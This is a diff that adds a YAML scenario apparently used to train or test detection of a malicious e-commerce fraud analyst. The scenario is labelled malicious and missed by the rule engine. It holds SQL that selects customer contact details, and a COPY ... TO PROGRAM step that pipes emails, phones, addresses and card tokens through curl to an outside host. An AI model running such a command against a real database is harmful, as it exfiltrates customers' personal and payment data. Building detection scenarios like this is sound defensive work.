@@ -1,0 +1,24 @@
+scenario_id: ecommerce_fraud_analyst_exfil_0002
+family_id: ecommerce_fraud_analyst_exfil_0002
+domain: ecommerce
+time_of_day: 01:15
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: fraud_analyst
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.4265919224579804
+  events:
+  - sql: SELECT c.full_name, c.email, c.shipping_address, COUNT(DISTINCT pay.card_last4) as card_count FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id =
+      o.order_id GROUP BY c.full_name, c.email, c.shipping_address HAVING COUNT(DISTINCT pay.card_last4) > 3
+  - step_id: exfil
+    sql: COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id)
+      TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'
+    connects_to:
+      ip: 77.247.181.165
+      port: 443
